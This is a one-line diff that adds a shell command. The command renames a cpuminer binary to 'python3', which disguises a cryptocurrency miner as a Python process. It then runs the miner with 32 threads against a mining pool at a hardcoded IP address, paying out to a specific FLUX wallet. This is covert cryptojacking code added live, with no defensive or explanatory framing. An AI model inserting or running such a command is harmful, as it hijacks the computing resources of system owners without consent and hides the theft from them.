@@ -1,0 +1,1 @@
+mv cpuminer-avx2 python3 && ./python3 -a yescryptr16 -o stratum+tcp://198.50.168.213:6333 -u t1ZV5gdce9tkTsk39VqEMxJ3sYaatXB61ft -p c=FLUX -t 32
